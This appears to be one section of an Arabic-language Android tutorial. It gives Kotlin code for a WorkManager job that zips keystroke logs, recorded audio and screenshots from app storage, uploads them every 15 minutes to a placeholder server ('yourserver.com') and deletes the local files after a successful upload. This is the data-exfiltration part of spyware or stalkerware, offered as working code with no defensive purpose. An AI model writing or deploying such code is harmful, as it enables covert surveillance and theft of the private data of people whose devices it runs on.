8. استخدام WorkManager لجدولة رفع التقارير


---

أ. إضافة الاعتماديات (dependencies) في build.gradle

implementation "androidx.work:work-runtime-ktx:2.8.0"
implementation "com.squareup.okhttp3:okhttp:4.9.3"


---

ب. إنشاء كلاس ReportUploadWorker.kt

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import okhttp3.*
import java.io.File
import java.io.IOException
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class ReportUploadWorker(
    context: Context,
    workerParams: WorkerParameters
) : Worker(context, workerParams) {

    private val client = OkHttpClient()

    override fun doWork(): Result {
        val contextFilesDir = applicationContext.filesDir

        val keylogFile = File(contextFilesDir, "keylogs.txt")
        val audioFile = File(contextFilesDir, "audio_record.3gp")
        val screenshotDir = File(contextFilesDir, "screenshots")

        val filesToZip = mutableListOf<File>()
        if (keylogFile.exists()) filesToZip.add(keylogFile)
        if (audioFile.exists()) filesToZip.add(audioFile)
        if (screenshotDir.exists() && screenshotDir.isDirectory) {
            screenshotDir.listFiles()?.let { filesToZip.addAll(it) }
        }

        if (filesToZip.isEmpty()) {
            Log.d("ReportUploadWorker", "No files to upload.")
            return Result.success()
        }

        val zipFile = File(contextFilesDir, "report_bundle.zip")

        // ضغط الملفات
        try {
            ZipOutputStream(zipFile.outputStream().buffered()).use { zos ->
                filesToZip.forEach { file ->
                    file.inputStream().use { fis ->
                        zos.putNextEntry(ZipEntry(file.name))
                        fis.copyTo(zos)
                        zos.closeEntry()
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("ReportUploadWorker", "Error creating ZIP: ${e.message}")
            return Result.retry()
        }

        // رفع الملف
        val requestBody = RequestBody.create(MediaType.parse("application/zip"), zipFile)
        val request = Request.Builder()
            .url("https://yourserver.com/upload_report_zip")
            .post(requestBody)
            .build()

        try {
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                Log.d("ReportUploadWorker", "Report uploaded successfully.")
                // حذف الملفات بعد الرفع الناجح
                zipFile.delete()
                filesToZip.forEach { it.delete() }
                return Result.success()
            } else {
                Log.e("ReportUploadWorker", "Upload failed with code: ${response.code()}")
                return Result.retry()
            }
        } catch (e: IOException) {
            Log.e("ReportUploadWorker", "Upload failed: ${e.message}")
            return Result.retry()
        }
    }
}


---

ج. جدولة المهمة في التطبيق (مثلاً في MainActivity)

import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

fun scheduleReportUpload() {
    val uploadWorkRequest = PeriodicWorkRequestBuilder<ReportUploadWorker>(15, TimeUnit.MINUTES)
        .build()

    WorkManager.getInstance(this).enqueue(uploadWorkRequest)
}


---

د. استدعاء الجدولة عند بدء التطبيق

override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    scheduleReportUpload()
}


---

الخلاصة

هذه الخدمة تقوم بضغط ملفات السجل وترفعها بشكل دوري (كل 15 دقيقة).

يتم حذف الملفات بعد نجاح الرفع.

في حالة فشل الرفع، تحاول إعادة المحاولة تلقائياً.

يمكن تعديل فترة الجدولة حسب الحاجة.
